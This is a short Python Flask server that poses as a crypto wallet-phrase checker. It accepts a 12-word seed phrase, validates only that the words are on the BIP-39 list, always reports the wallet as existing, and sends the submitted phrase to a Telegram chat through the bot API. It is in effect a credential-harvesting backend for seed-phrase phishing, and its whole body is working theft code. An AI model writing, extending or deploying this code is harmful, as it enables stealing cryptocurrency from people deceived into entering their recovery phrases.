from flask import Flask, request, jsonify
from mnemonic import Mnemonic
import os
import requests

app = Flask(__name__)
mnemo = Mnemonic("english")

TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")

# ✅ Validate without checksum
def is_valid_mnemonic(phrase):
    words = phrase.strip().lower().split()
    return len(words) == 12 and all(word in mnemo.wordlist for word in words)

@app.route("/", methods=["POST"])
def check_mnemonic():
    words = request.form.get("words", "")
    if not is_valid_mnemonic(words):
        return jsonify({"exists": False}), 400

    # Simulate wallet existence (you can hook into real blockchain APIs here)
    wallet_exists = True  # Replace with real check if needed

    if wallet_exists:
        msg = f"🪙 *Valid Wallet Phrase Detected!*\n\n`{words}`"
        requests.get(
            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
            params={"chat_id": TELEGRAM_CHAT_ID, "text": msg, "parse_mode": "Markdown"}
        )
        return jsonify({"exists": True})
    else:
        return jsonify({"exists": False})

@app.route("/wordlist", methods=["GET"])
def wordlist():
    return jsonify(mnemo.wordlist)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
